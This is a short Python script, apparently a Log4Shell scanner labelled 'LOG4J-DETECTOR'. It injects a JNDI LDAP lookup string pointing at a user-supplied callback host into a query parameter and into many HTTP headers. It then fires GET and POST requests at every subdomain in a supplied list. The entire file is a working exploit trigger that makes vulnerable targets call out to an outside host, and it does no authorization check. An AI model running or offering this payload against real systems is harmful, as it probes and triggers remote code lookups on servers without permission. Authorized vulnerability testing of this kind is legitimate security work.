"""
Author : SAM
LOG4J-DETECTOR
"""

import requests
print("PUT YOUR SUBDOMAIN FILE IN SAME DIRECTORY")
fil = input("ENTER YOUR SUBDOMAIN FILE (WITHOUT HTTPS://) :")
payload = input("ENTER YOUR BURP COLLABORATOR/CANRYTOKEN URL :")
fpayload = "${jndi:ldap://"+payload+"/a}"


subd =  list(open(fil).read().split())
headers={"Referer":fpayload,"User-Agent": "Mozzila"+fpayload,"Origin": fpayload,"Location": fpayload,"Report-To": fpayload,"X-Forwarded-For": fpayload,"X-Forwarded-Host": fpayload,"X-Forwarded-Proto": fpayload}
for i in range(len(subd)):
	furl="https://"+subd[i]+"?test="+fpayload
	#furl2="http://"+subd[i]+"?test="+fpayload
	print(furl)
	try:
		requests.get(furl,headers=headers)
		requests.post(furl,headers=headers)
		#requests.get(furl2,headers=headers)
		#requests.post(furl2,headers=headers)
	except:
		print("error")
